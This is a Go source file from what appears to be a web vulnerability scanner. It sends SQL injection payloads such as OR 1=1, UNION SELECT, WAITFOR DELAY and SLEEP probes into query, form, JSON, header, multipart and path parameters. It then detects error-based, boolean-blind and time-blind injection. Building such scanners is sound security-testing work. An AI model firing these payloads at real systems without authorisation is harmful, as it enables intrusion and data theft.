package scanner

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"sleepywalker/internal/config"
	"sleepywalker/internal/learningdb"
	"sleepywalker/internal/utils"
)

// HeuristicResult holds the outcome of a local SQL injection probe.
type HeuristicResult struct {
	Entry         EntryPoint
	Suspicious    bool
	MatchedErrors []string // which DB error signatures were found
	TestPayload   string   // the payload that triggered the match
}

// sqlErrorSignatures maps database engines to strings commonly found in
// unhandled SQL error messages. Checked case-insensitively.
var sqlErrorSignatures = []struct {
	Engine  string
	Pattern string
}{
	// MySQL / MariaDB
	{"MySQL", "you have an error in your sql syntax"},
	{"MySQL", "warning: mysql"},
	{"MySQL", "unclosed quotation mark after the character string"},
	{"MySQL", "mysql_fetch"},
	{"MySQL", "mysql_num_rows"},
	{"MySQL", "supplied argument is not a valid mysql"},

	// PostgreSQL
	{"PostgreSQL", "pg_query():"},
	{"PostgreSQL", "pg_exec():"},
	{"PostgreSQL", "unterminated quoted string"},
	{"PostgreSQL", "syntax error at or near"},
	{"PostgreSQL", "invalid input syntax for"},

	// Microsoft SQL Server
	{"MSSQL", "microsoft ole db provider for sql server"},
	{"MSSQL", "unclosed quotation mark"},
	{"MSSQL", "[microsoft][odbc sql server driver]"},
	{"MSSQL", "mssql_query()"},
	{"MSSQL", "incorrect syntax near"},

	// Oracle
	{"Oracle", "ora-00933"},
	{"Oracle", "ora-01756"},
	{"Oracle", "ora-06512"},
	{"Oracle", "oracle error"},
	{"Oracle", "quoted string not properly terminated"},

	// SQLite
	{"SQLite", "sqlite3::query"},
	{"SQLite", "sqlite_error"},
	{"SQLite", "sqlite.exception"},
	{"SQLite", "near \"\": syntax error"},

	// Generic JDBC / ODBC
	{"JDBC/ODBC", "jdbc."},
	{"JDBC/ODBC", "[odbc"},
	{"JDBC/ODBC", "sql syntax"},
	{"JDBC/ODBC", "sql error"},
}

// testPayloads are classic probe strings injected into parameter values.
var testPayloads = []string{
	"'",
	"\"",
	"1' OR '1'='1",
	"1\" OR \"1\"=\"1",
	"1 OR 1=1--",
	"' OR ''='",
	"'; WAITFOR DELAY '0:0:5'--",
	"1; SELECT 1--",
	"' UNION SELECT NULL--",
	"1' AND 1=CONVERT(int,(SELECT @@version))--",
}

// effectiveSignatures returns the built-in SQL error signatures merged with
// any patterns learned from prior scans.
func effectiveSignatures() []struct{ Engine, Pattern string } {
	base := make([]struct{ Engine, Pattern string }, len(sqlErrorSignatures))
	for i, s := range sqlErrorSignatures {
		base[i] = struct{ Engine, Pattern string }{s.Engine, s.Pattern}
	}
	if db := learningdb.Global(); db != nil {
		for _, ls := range db.ErrorSignatures() {
			base = append(base, struct{ Engine, Pattern string }{ls.Engine, ls.Pattern})
		}
	}
	return base
}

// effectivePayloads returns the built-in test payloads merged with the
// top learned payloads for the given injection context, de-duplicated.
func effectivePayloads(injectionCtx string) []string {
	seen := make(map[string]bool)
	var out []string
	for _, p := range testPayloads {
		if !seen[p] {
			seen[p] = true
			out = append(out, p)
		}
	}
	if db := learningdb.Global(); db != nil {
		for _, p := range db.TopPayloads(injectionCtx, 10) {
			if !seen[p] {
				seen[p] = true
				out = append(out, p)
			}
		}
	}
	return out
}

// matchErrorSignaturesEnriched scans a response body for known SQL error patterns,
// including any patterns learned from prior scans.
func matchErrorSignaturesEnriched(body string) []string {
	lower := strings.ToLower(body)
	seen := make(map[string]bool)
	var matched []string
	for _, sig := range effectiveSignatures() {
		if strings.Contains(lower, sig.Pattern) && !seen[sig.Engine] {
			seen[sig.Engine] = true
			matched = append(matched, fmt.Sprintf("%s: %q", sig.Engine, sig.Pattern))
		}
	}
	return matched
}

// HeuristicScan probes every entry point with common SQL injection payloads
// and inspects the HTTP response body for known database error signatures.
// Uses concurrency when threads > 1. Respects cfg.MaxRequests budget via RateLimiter.
func HeuristicScan(cfg *config.Config, eps []EntryPoint) []HeuristicResult {
	client := cfg.BuildHTTPClient(10 * time.Second)
	threads := cfg.Threads
	if threads < 1 {
		threads = 1
	}

	// Fix #5: create a rate limiter that gates every probe request.
	rl := utils.NewRateLimiter(cfg.RateDelay, cfg.MaxRequests)

	results := make([]HeuristicResult, len(eps))
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for i, ep := range eps {
		wg.Add(1)
		go func(idx int, ep EntryPoint) {
			defer wg.Done()
			sem <- struct{}{}        // acquire
			defer func() { <-sem }() // release

			hr := probeEntryPoint(client, cfg, ep, rl)
			results[idx] = hr
			if hr.Suspicious {
				log.Printf("[HEURISTIC] ⚠  Suspicious: %s %s [%s] (errors: %v, payload: %q)",
					ep.Method, ep.URL, ep.InjectionLoc, hr.MatchedErrors, hr.TestPayload)
			} else {
				log.Printf("[HEURISTIC] ✓  Clean: %s %s [%s]", ep.Method, ep.URL, ep.InjectionLoc)
			}
		}(i, ep)
	}
	wg.Wait()
	return results
}

// probeEntryPoint tries every payload against a single entry point,
// respecting the rate limiter for every request sent.
// Phase 1a: error-based detection (fast)
// Phase 1b: blind pre-screen (boolean differential) if no errors found
func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl *utils.RateLimiter) HeuristicResult {
	db := learningdb.Global()

	// Skip if this URL+param was previously confirmed clean by the learning DB.
	if db != nil {
		host := extractHost(ep.URL)
		if db.IsFalsePositive(host, "", "", 5) {
			log.Printf("[HEURISTIC] ↩  Skipping (learning DB: known FP host): %s", ep.URL)
			return HeuristicResult{Entry: ep, Suspicious: false}
		}
	}

	// ── Phase 1a: error signature matching ──────────────────────────
	payloads := effectivePayloads(ep.InjectionLoc)
	for _, payload := range payloads {
		if !rl.Wait() {
			log.Printf("[HEURISTIC] Request budget exhausted, stopping probes for %s", ep.URL)
			return HeuristicResult{Entry: ep, Suspicious: false}
		}
		body, statusCode, err := sendProbeRequestWithStatus(client, cfg, ep, payload)
		rl.RecordResponse(statusCode)
		if err != nil {
			continue
		}
		matched := matchErrorSignaturesEnriched(body)
		if len(matched) > 0 {
			if db != nil {
				// Record once as a successful hit (attempt=1, fired=true).
				db.RecordPayloadAttempt(payload, ep.InjectionLoc, "", true)
			}
			return HeuristicResult{
				Entry:         ep,
				Suspicious:    true,
				MatchedErrors: matched,
				TestPayload:   payload,
			}
		}
		// Payload did not fire — record as a failed attempt.
		if db != nil {
			db.RecordPayloadAttempt(payload, ep.InjectionLoc, "", false)
		}
	}

	// ── Phase 1b: blind pre-screen (boolean) ───────────────────────
	// No error signatures found — do a fast boolean differential to catch
	// blind SQLi where errors are suppressed.
	if !rl.Wait() {
		return HeuristicResult{Entry: ep, Suspicious: false}
	}
	if blindPreScreen(client, cfg, ep) {
		log.Printf("[HEURISTIC] ⚠  Blind candidate: %s %s [%s] (boolean differential detected)",
			ep.Method, ep.URL, ep.InjectionLoc)
		return HeuristicResult{
			Entry:         ep,
			Suspicious:    true,
			MatchedErrors: []string{"blind-sqli: boolean response differential"},
			TestPayload:   "boolean-differential",
		}
	}

	// ── Phase 1c: time-based pre-screen ─────────────────────────────
	// Boolean differential failed — endpoint may suppress all output changes.
	// Do a single-round timing check: if a SLEEP payload takes significantly
	// longer than baseline, flag for full Phase 2 time-blind validation.
	if !rl.Wait() {
		return HeuristicResult{Entry: ep, Suspicious: false}
	}
	if timePreScreen(client, cfg, ep) {
		log.Printf("[HEURISTIC] ⚠  Blind candidate: %s %s [%s] (timing anomaly detected)",
			ep.Method, ep.URL, ep.InjectionLoc)
		return HeuristicResult{
			Entry:         ep,
			Suspicious:    true,
			MatchedErrors: []string{"blind-sqli: timing anomaly"},
			TestPayload:   "time-based",
		}
	}

	return HeuristicResult{Entry: ep, Suspicious: false}
}

// blindPreScreen performs a boolean-based differential check to detect blind SQL injection.
// The key insight that eliminates false positives like YouTube:
//
//	Real blind SQLi:  baseline ≈ true_payload AND baseline ≠ false_payload
//	Random app:       baseline ≠ true_payload AND baseline ≠ false_payload
//
// We require the true condition to closely match the original baseline AND
// the false condition to differ from it. Both must hold consistently across
// 2 rounds to survive dynamic content (timestamps, ads, CSRF tokens).
func blindPreScreen(client *http.Client, cfg *config.Config, ep EntryPoint) bool {
	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": "1"}
	}

	type boolPair struct{ truePl, falsePl, neutral string }

	// Choose boolean pairs appropriate for the injection location.
	var pairs []boolPair
	switch ep.InjectionLoc {
	case "header":
		// Header values are typically string context; neutral is a normal browser string.
		pairs = []boolPair{
			{"Mozilla/5.0' AND '1'='1'-- -", "Mozilla/5.0' AND '1'='2'-- -", "Mozilla/5.0"},
			{"test' AND '1'='1'-- -", "test' AND '1'='2'-- -", "test"},
			{"1' AND '1'='1'-- -", "1' AND '1'='2'-- -", "1"},
		}
	default:
		// Numeric and string contexts for query/body/json params.
		pairs = []boolPair{
			{"1 AND 1=1-- -", "1 AND 1=2-- -", "1"},
			{"1 AND 1=1#", "1 AND 1=2#", "1"},
			{"1' AND '1'='1'-- -", "1' AND '1'='2'-- -", "1"},
			{"1' AND '1'='1'#", "1' AND '1'='2'#", "1"},
		}
	}

	const rounds = 2

	for targetKey := range params {
		for _, pair := range pairs {
			// Fetch baseline using the original param value, or the pair's neutral.
			neutralVal := ep.Params[targetKey]
			if neutralVal == "" {
				neutralVal = pair.neutral
			}
			baseline := fetchParamWithPayload(client, cfg, ep, targetKey, neutralVal)
			if baseline == "" {
				continue
			}

			trueSimilarCount := 0
			falseDifferCount := 0

			for i := 0; i < rounds; i++ {
				trueBody := fetchParamWithPayload(client, cfg, ep, targetKey, pair.truePl)
				falseBody := fetchParamWithPayload(client, cfg, ep, targetKey, pair.falsePl)
				if trueBody == "" || falseBody == "" {
					break
				}

				trueSim := jaccardSimilarity(baseline, trueBody)
				falseSim := jaccardSimilarity(baseline, falseBody)

				if trueSim > 0.85 {
					trueSimilarCount++
				}
				if falseSim < 0.70 {
					falseDifferCount++
				}
			}

			if trueSimilarCount == rounds && falseDifferCount == rounds {
				log.Printf("[HEURISTIC]   Blind pre-screen: true≈baseline AND false≠baseline (loc=%s param=%s payload=%s)",
					ep.InjectionLoc, targetKey, pair.truePl)
				return true
			}
		}
	}
	return false
}

// fetchParamWithPayload sends a request injecting payload into a specific parameter only,
// using the correct method and content-type for the entry point.
func fetchParamWithPayload(client *http.Client, cfg *config.Config, ep EntryPoint, targetKey, payload string) string {
	switch ep.InjectionLoc {
	case "header":
		req, err := http.NewRequest("GET", ep.URL, nil)
		if err != nil {
			return ""
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		// Inject payload into the target header; leave all other headers at their cfg values.
		req.Header.Set(targetKey, payload)
		body, _, err := doRequestWithStatus(client, req)
		if err != nil {
			return ""
		}
		return body

	case "json":
		jsonBody := make(map[string]interface{})
		for k, v := range ep.Params {
			if k == targetKey {
				jsonBody[k] = payload
			} else {
				neutral := v
				if neutral == "" {
					neutral = "1"
				}
				jsonBody[k] = neutral
			}
		}
		b, err := json.Marshal(jsonBody)
		if err != nil {
			return ""
		}
		req, err := http.NewRequest("POST", ep.URL, bytes.NewReader(b))
		if err != nil {
			return ""
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, _, err := doRequestWithStatus(client, req)
		if err != nil {
			return ""
		}
		return body

	case "body", "multipart":
		form := url.Values{}
		for k, v := range ep.Params {
			if k == targetKey {
				form.Set(k, payload)
			} else {
				neutral := v
				if neutral == "" {
					neutral = "1"
				}
				form.Set(k, neutral)
			}
		}
		req, err := http.NewRequest(ep.Method, ep.URL, strings.NewReader(form.Encode()))
		if err != nil {
			return ""
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, _, err := doRequestWithStatus(client, req)
		if err != nil {
			return ""
		}
		return body

	default: // query
		u, err := url.Parse(ep.URL)
		if err != nil {
			return ""
		}
		q := u.Query()
		for k, v := range ep.Params {
			if k == targetKey {
				q.Set(k, payload)
			} else {
				neutral := v
				if neutral == "" {
					neutral = "1"
				}
				q.Set(k, neutral)
			}
		}
		u.RawQuery = q.Encode()
		req, err := http.NewRequest(ep.Method, u.String(), nil)
		if err != nil {
			return ""
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, _, err := doRequestWithStatus(client, req)
		if err != nil {
			return ""
		}
		return body
	}
}

// sendProbeRequestWithStatus dispatches the request and returns body, HTTP status, and error.
// Supports GET, POST (form-encoded), POST (multipart), PUT, PATCH, DELETE, header, JSON, and path segment injection.
func sendProbeRequestWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	switch ep.InjectionLoc {
	case "header":
		return sendHeaderProbeWithStatus(client, cfg, ep, payload)
	case "json":
		return sendJSONProbeWithStatus(client, cfg, ep, payload)
	case "multipart":
		return sendMultipartProbeWithStatus(client, cfg, ep, payload)
	case "path":
		return sendPathProbeWithStatus(client, cfg, ep, payload)
	default:
		switch ep.Method {
		case "POST", "PUT", "PATCH":
			return sendBodyProbeWithStatus(client, cfg, ep, payload)
		case "DELETE":
			return sendGETProbeWithStatus(client, cfg, ep, payload)
		default:
			return sendGETProbeWithStatus(client, cfg, ep, payload)
		}
	}
}

// sendProbeRequest is kept for compatibility — delegates to the status variant.
func sendProbeRequest(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, error) {
	body, _, err := sendProbeRequestWithStatus(client, cfg, ep, payload)
	return body, err
}

// sendGETProbeWithStatus tests each query parameter individually (fix gap #3).
func sendGETProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": ""}
	}

	// Fix: use the actual param value as the neutral — not a hardcoded "1".
	// DVWA-style forms have submit buttons with value="Submit" that the server
	// checks with isset($_GET['Submit']). Sending Submit=1 skips the query entirely.
	for targetKey := range params {
		u, err := url.Parse(ep.URL)
		if err != nil {
			continue
		}
		q := u.Query()
		for key, val := range params {
			if key == targetKey {
				q.Set(key, payload)
			} else {
				// Use the actual declared value first; fall back to "1" only if empty.
				neutral := val
				if neutral == "" {
					neutral = "1"
				}
				q.Set(key, neutral)
			}
		}
		// Strip fragment — HTTP clients don't send it, but it confuses URL construction.
		u.Fragment = ""
		u.RawQuery = q.Encode()
		req, err := http.NewRequest(ep.Method, u.String(), nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
	}
	// Fallback: inject payload into every non-button injectable param while preserving
	// declared values for others (e.g. Submit=Submit). Unlike the per-param loop above
	// which tests each param in isolation, this sends all empty-value params together.
	u, err := url.Parse(ep.URL)
	if err != nil {
		return "", 0, err
	}
	u.Fragment = ""
	q := u.Query()
	for key, val := range params {
		if val == "" {
			// Param has no declared value — it's an input field; inject the payload.
			q.Set(key, payload)
		} else {
			// Param has a declared value (e.g. Submit=Submit) — preserve it.
			q.Set(key, val)
		}
	}
	u.RawQuery = q.Encode()
	req, err := http.NewRequest(ep.Method, u.String(), nil)
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("User-Agent", "SleepyWalker/1.0")
	cfg.ApplyHeaders(req)
	return doRequestWithStatus(client, req)
}

// sendBodyProbeWithStatus sends a form-encoded body for POST/PUT/PATCH, testing
// each parameter individually with neutral values for all others (fix gap #3).
func sendBodyProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	var bestBody string
	var bestCode int

	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": ""}
	}

	// Test each param individually — inject payload into one, preserve actual
	// values for all others (e.g. Submit=Submit so the server executes the query).
	for targetKey := range params {
		form := url.Values{}
		for key, val := range params {
			if key == targetKey {
				form.Set(key, payload)
			} else {
				neutral := val
				if neutral == "" {
					neutral = "1"
				}
				form.Set(key, neutral)
			}
		}
		req, err := http.NewRequest(ep.Method, ep.URL, strings.NewReader(form.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		// Return as soon as we find a match — caller checks signatures.
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
		bestBody = body
		bestCode = code
	}
	return bestBody, bestCode, nil
}

// sendHeaderProbeWithStatus injects payload into each header individually, returns body + status.
func sendHeaderProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	for headerName := range ep.Params {
		req, err := http.NewRequest("GET", ep.URL, nil)
		if err != nil {
			return "", 0, err
		}
		// Set all other headers to their neutral values first.
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		// Inject payload into this specific header.
		req.Header.Set(headerName, payload)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
	}
	// Return last response if no match.
	req, err := http.NewRequest("GET", ep.URL, nil)
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("User-Agent", "SleepyWalker/1.0")
	cfg.ApplyHeaders(req)
	for headerName := range ep.Params {
		req.Header.Set(headerName, payload)
	}
	return doRequestWithStatus(client, req)
}

// sendJSONProbeWithStatus sends a JSON POST body, returns body + status.
func sendJSONProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	jsonBody := make(map[string]string)
	for key := range ep.Params {
		jsonBody[key] = payload
	}
	if len(ep.Params) == 0 {
		jsonBody["id"] = payload
	}
	bodyBytes, err := json.Marshal(jsonBody)
	if err != nil {
		return "", 0, err
	}
	req, err := http.NewRequest("POST", ep.URL, bytes.NewReader(bodyBytes))
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "SleepyWalker/1.0")
	cfg.ApplyHeaders(req)
	return doRequestWithStatus(client, req)
}

// sendMultipartProbeWithStatus sends a multipart/form-data POST, testing each
// field individually. Used for forms with enctype="multipart/form-data".
func sendMultipartProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"file": ""}
	}

	var bestBody string
	var bestCode int

	for targetKey := range params {
		var buf bytes.Buffer
		mw := multipart.NewWriter(&buf)
		for key, val := range params {
			var fieldVal string
			if key == targetKey {
				fieldVal = payload
			} else {
				fieldVal = val
				if fieldVal == "" {
					fieldVal = "test"
				}
			}
			// Use CreateFormField for text fields; file fields get a filename.
			inputType := strings.ToLower(val)
			if inputType == "file" || strings.HasSuffix(key, "file") || strings.HasSuffix(key, "upload") {
				fw, err := mw.CreateFormFile(key, "test.txt")
				if err != nil {
					continue
				}
				fw.Write([]byte(fieldVal))
			} else {
				fw, err := mw.CreateFormField(key)
				if err != nil {
					continue
				}
				fw.Write([]byte(fieldVal))
			}
		}
		mw.Close()

		req, err := http.NewRequest("POST", ep.URL, &buf)
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", mw.FormDataContentType())
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
		bestBody = body
		bestCode = code
	}
	return bestBody, bestCode, nil
}

// sendPathProbeWithStatus replaces each injectable path segment with the payload
// and sends the request. e.g. /api/users/123 → /api/users/'
func sendPathProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	if len(ep.PathSegments) == 0 {
		return "", 0, nil
	}

	var bestBody string
	var bestCode int

	for _, seg := range ep.PathSegments {
		// Replace the first occurrence of this segment in the path.
		injectURL := strings.Replace(ep.URL, "/"+seg, "/"+url.PathEscape(payload), 1)
		req, err := http.NewRequest(ep.Method, injectURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
		bestBody = body
		bestCode = code
	}
	return bestBody, bestCode, nil
}

// timePreScreen does a fast single-round timing check.
// Only tries MySQL SLEEP (the most common DB) to keep the check fast.
// Tests only the first likely-injectable parameter to avoid N×4 requests per endpoint.
func timePreScreen(client *http.Client, cfg *config.Config, ep EntryPoint) bool {
	timeClient := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	if cfg != nil && cfg.ProxyURL != "" {
		timeClient = cfg.BuildHTTPClient(15 * time.Second)
	}

	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": "1"}
	}

	// Pick only the most likely injectable param to keep request count low.
	targetKey := pickLikelyInjectableParam(params)
	neutralVal := params[targetKey]
	if neutralVal == "" {
		neutralVal = "1"
	}

	// Try both numeric and string-quoted MySQL SLEEP variants.
	sleepPayloads := []string{
		"1 AND SLEEP(3)-- -",
		"1' AND SLEEP(3)-- -",
	}

	baseStart := time.Now()
	fetchParamWithPayloadClient(timeClient, cfg, ep, targetKey, neutralVal)
	baseDur := time.Since(baseStart)

	// If the baseline itself is slow (≥2s), timing-based detection is unreliable.
	// Endpoints like command injection pages that time out return false timing signals.
	if baseDur >= 2*time.Second {
		log.Printf("[HEURISTIC]   Time pre-screen: skipped (slow baseline %v) for %s", baseDur, ep.URL)
		return false
	}

	for _, payload := range sleepPayloads {
		// Run the SLEEP probe twice to filter out single-request network variance.
		var delays []time.Duration
		for round := 0; round < 2; round++ {
			start := time.Now()
			fetchParamWithPayloadClient(timeClient, cfg, ep, targetKey, payload)
			elapsed := time.Since(start)
			delays = append(delays, elapsed)
		}
		// Both rounds must significantly exceed baseline to avoid single-request flukes.
		if delays[0] > baseDur+2*time.Second && delays[0] > 2500*time.Millisecond &&
			delays[1] > baseDur+2*time.Second && delays[1] > 2500*time.Millisecond {
			log.Printf("[HEURISTIC]   Time pre-screen: baseline=%v delay1=%v delay2=%v param=%s payload=%s",
				baseDur, delays[0], delays[1], targetKey, payload)
			return true
		}
	}
	return false
}

// pickLikelyInjectableParam returns the most likely injectable parameter name.
// Prefers known injectable names; skips submit buttons, CSRF tokens, and password-confirm fields.
func pickLikelyInjectableParam(params map[string]string) string {
	priority := []string{"id", "uid", "user", "username", "name", "search", "query", "q", "page", "cat", "item", "input"}
	skip := map[string]bool{
		"submit": true, "token": true, "csrf": true, "_token": true, "action": true,
		"change": true, "login": true, "password_conf": true, "password_current": true,
		"password_new": true, "confirm": true,
	}
	for _, p := range priority {
		if _, ok := params[p]; ok {
			return p
		}
	}
	// Fall back to first non-skip param.
	for k := range params {
		if !skip[strings.ToLower(k)] {
			return k
		}
	}
	for k := range params {
		return k
	}
	return "id"
}

// fetchParamWithPayloadClient is like fetchParamWithPayload but accepts an explicit client
// so the time pre-screen can use a longer timeout without touching the main heuristic client.
func fetchParamWithPayloadClient(client *http.Client, cfg *config.Config, ep EntryPoint, targetKey, payload string) {
	switch ep.InjectionLoc {
	case "header":
		req, err := http.NewRequest("GET", ep.URL, nil)
		if err != nil {
			return
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		req.Header.Set(targetKey, payload)
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

	case "json":
		jsonBody := make(map[string]interface{})
		for k, v := range ep.Params {
			if k == targetKey {
				jsonBody[k] = payload
			} else {
				if v == "" {
					v = "1"
				}
				jsonBody[k] = v
			}
		}
		b, err := json.Marshal(jsonBody)
		if err != nil {
			return
		}
		req, err := http.NewRequest("POST", ep.URL, bytes.NewReader(b))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

	case "body", "multipart":
		form := url.Values{}
		for k, v := range ep.Params {
			if k == targetKey {
				form.Set(k, payload)
			} else {
				if v == "" {
					v = "1"
				}
				form.Set(k, v)
			}
		}
		req, err := http.NewRequest(ep.Method, ep.URL, strings.NewReader(form.Encode()))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

	default: // query / GET
		u, err := url.Parse(ep.URL)
		if err != nil {
			return
		}
		q := u.Query()
		for k, v := range ep.Params {
			if k == targetKey {
				q.Set(k, payload)
			} else {
				if v == "" {
					v = "1"
				}
				q.Set(k, v)
			}
		}
		u.RawQuery = q.Encode()
		req, err := http.NewRequest(ep.Method, u.String(), nil)
		if err != nil {
			return
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

// doRequestWithStatus executes the request and returns the response body (up to 256 KB) and HTTP status code.
func doRequestWithStatus(client *http.Client, req *http.Request) (string, int, error) {
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	if err != nil {
		return "", resp.StatusCode, err
	}
	return string(b), resp.StatusCode, nil
}

// doRequest executes the request and returns the response body (up to 256 KB).
func doRequest(client *http.Client, req *http.Request) (string, error) {
	body, _, err := doRequestWithStatus(client, req)
	return body, err
}

// matchErrorSignatures scans a response body for known SQL error patterns.
func matchErrorSignatures(body string) []string {
	lower := strings.ToLower(body)
	seen := make(map[string]bool)
	var matched []string
	for _, sig := range sqlErrorSignatures {
		if strings.Contains(lower, sig.Pattern) && !seen[sig.Engine] {
			seen[sig.Engine] = true
			matched = append(matched, fmt.Sprintf("%s: %q", sig.Engine, sig.Pattern))
		}
	}
	return matched
}

// extractHost returns the hostname from a URL string, or the raw string on parse failure.
func extractHost(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil || u.Host == "" {
		return rawURL
	}
	return u.Hostname()
}
